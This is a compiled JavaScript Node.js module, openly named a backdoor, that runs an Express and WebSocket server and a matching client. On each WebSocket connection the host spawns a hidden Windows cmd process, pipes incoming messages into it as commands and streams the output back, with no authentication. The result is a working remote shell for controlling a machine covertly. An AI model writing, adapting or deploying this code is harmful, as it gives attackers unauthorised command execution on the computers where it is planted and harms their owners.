"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.BackdoorHost = exports.Backdoor = void 0;
const ws_1 = __importDefault(require("ws"));
const express_1 = __importDefault(require("express"));
const dotenv_1 = __importDefault(require("dotenv"));
const cli_color_1 = __importDefault(require("cli-color"));
const router_1 = __importDefault(require("./config/router"));
const child_process_1 = require("child_process");
class Backdoor {
    ws;
    listeners;
    constructor() {
        this.listeners = [];
    }
    FListener(name, ...args) {
        const ls = this.listeners.filter((e) => e.name === name);
        if (!ls.length)
            return;
        ls.forEach((e) => {
            e.handler(...args);
        });
        return;
    }
    async on(listener, handler) {
        this.listeners.push({
            name: listener,
            handler,
        });
    }
    async connect(host, port, wss) {
        this.ws = new ws_1.default(`${wss ? "wss" : "ws"}://${host}${port ? ":" + parseInt(port.toString()) : ""}/run`);
        return new Promise((resolve, reject) => {
            this.ws.on("open", () => {
                this.ws.on("message", (res) => {
                    this.FListener("response", JSON.parse(res.toString()));
                });
                resolve();
            });
            this.ws.on("close", (code, reason) => reject({ code, reason }));
        });
    }
    emit(code) {
        this.ws.send(code);
    }
}
exports.Backdoor = Backdoor;
const host = {
    init: async (log = false) => {
        dotenv_1.default.config();
        const { PORT } = process.env;
        const app = (0, express_1.default)();
        const router = (0, router_1.default)({
            routesDir: "./routes/",
            indexFilename: (file) => ["index.js", "index.ts"].includes(file),
        });
        app.use(express_1.default.json({
            limit: "5mb",
        }));
        app.use(express_1.default.urlencoded({
            extended: true,
            limit: "5mb",
        }));
        app.use(router);
        const server = app.listen(PORT, () => {
            const address = server.address();
            if (!log)
                return;
            if (typeof address === "string") {
                console.log(cli_color_1.default.yellow(`🎉 Backdoor is on ${address}`));
            }
            else {
                console.log(cli_color_1.default.yellow(`🎉 Backdoor is on http://[::1]:${address.port}/`));
            }
        });
        const wss = new ws_1.default.Server({ server });
        wss.on("connection", (ws) => {
            const child = (0, child_process_1.spawn)("cmd", {
                windowsHide: true,
            });
            ws.on("message", (data) => {
                child.stdin.write(data + "\n");
            });
            child.stdout.on("data", (output) => {
                const response = output.toString();
                ws.send(JSON.stringify({
                    error: false,
                    response: response.toString(),
                }));
            });
            child.stderr.on("data", (output) => {
                const response = output.toString();
                ws.send(JSON.stringify({
                    error: true,
                    response: response.toString(),
                }));
            });
        });
        wss.on("error", (error) => {
            if (!log)
                return;
            console.error("Error en WebSocket:", error);
        });
    },
};
exports.BackdoorHost = host;
